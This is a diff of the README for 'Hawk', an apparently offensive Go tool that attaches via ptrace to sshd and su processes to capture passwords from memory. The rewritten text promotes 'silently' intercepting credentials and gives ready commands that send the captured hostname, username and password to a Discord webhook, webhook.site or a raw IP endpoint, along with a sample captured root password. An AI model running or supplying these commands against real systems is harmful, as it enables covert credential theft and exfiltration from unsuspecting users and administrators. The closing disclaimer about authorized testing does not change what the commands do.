@@ -5,22 +5,23 @@
 Hawk
 </h1>
 
-Hawk is a lightweight Golang tool designed to monitor the `sshd` and `su` services for passwords on Linux systems. It reads the content of the proc directory to capture events, and ptrace to trace syscalls related to password-based authentication.
+<p align="center">
+  <b>Silently intercept SSH and SU credentials in real-time</b>
+</p>
+
+<p align="center">
+  Hawk monitors <code>sshd</code> and <code>su</code> processes, extracting passwords from memory via ptrace without modifying target processes. Zero writes. Pure read-only credential harvesting.
+</p>
 
 ## Demo
 
-![Example](example.gif)
+![Example](demo/hawk-demo.gif)
 
-## Blog Post
-https://www.prodefense.io/blog/hawks-prey-snatching-ssh-credentials
+## How It Works
 
-## Features
+Hawk leverages Linux's `/proc` filesystem to discover SSH and SU processes, then uses `ptrace` to attach and intercept syscalls. When password authentication occurs, it reads the password directly from process memory during the `write()` syscall—completely transparent to the target process. Credentials are exfiltrated via webhook or printed to stdout.
 
-- Monitors SSH and SU commands for passwords
-- Reads memory from sshd and su syscalls without writing to traced processes
-- Exfiltrates passwords via HTTP or HTTPS to a specified webhook URL
-- Auto-detects protocol from URL (http:// or https://)
-- Stdout fallback when no webhook URL is provided
+**Deep dive:** [Blog Post](https://www.prodefense.io/blog/hawks-prey-snatching-ssh-credentials)
 
 ## Build
 
@@ -30,53 +31,54 @@ GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o hawk
 
 ## Usage
 
-Hawk accepts an optional webhook URL as a command-line argument. The protocol (HTTP/HTTPS) is automatically detected from the URL.
+### Discord Webhook
 
-### With Webhook URL
+Hawk automatically detects Discord webhooks and sends formatted messages:
 
-**HTTPS Webhook:**
 ```bash
-./hawk https://webhook.site/<GUID>
+./hawk https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
 ```
 
-**HTTP Webhook:**
+**Setup:** Create a webhook in your Discord server following [Discord's webhook guide](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks). Credentials will appear in your channel formatted with hostname, username, and password.
+
+### Generic Webhooks
+
+For other webhook services (webhook.site, custom servers, etc.):
+
 ```bash
+# HTTPS (auto-detected)
+./hawk https://webhook.site/your-unique-id
+
+# HTTP
 ./hawk http://192.168.1.100:6969/webhook
-```
 
-**Auto-detection:** If no protocol is specified, HTTPS is used by default:
-```bash
+# Auto HTTPS if no protocol specified
 ./hawk webhook.example.com/path
 ```
 
-### Without Webhook URL (Stdout)
+### Stdout Mode
 
-If no webhook URL is provided, credentials are printed to stdout:
+No webhook? Credentials print to stdout:
+
 ```bash
 ./hawk
 ```
 
-Output format:
+Output:
 ```
-hostname=xxx username=xxx password=xxx
-```
-
-### Examples
-
-**Webhook.site Example:**
-```bash
-./hawk https://webhook.site/f436b722-284a-4f5f-9aa8-1234567890
+hostname=server01 username=root password=SuperSecret123
 ```
 
-## Limitations
+## Requirements
 
-- Linux systems with ptrace enabled
-- `/proc` filesystem must be mounted
+- Linux system with ptrace enabled
+- `/proc` filesystem mounted
+- Root privileges (required for ptrace)
 
 ## Disclaimer
 
-This tool is intended for ethical and educational purposes only. Unauthorized use is prohibited. Use at your own risk.
+**This tool is for authorized security testing and educational purposes only.** Unauthorized access to computer systems is illegal. Use responsibly and only on systems you own or have explicit permission to test.
 
 ## Credits
 
-Hawk is inspired by the work of [blendin](https://github.com/blendin) and their tool [3snake](https://github.com/blendin/3snake).
+Inspired by [blendin](https://github.com/blendin)'s work on [3snake](https://github.com/blendin/3snake).
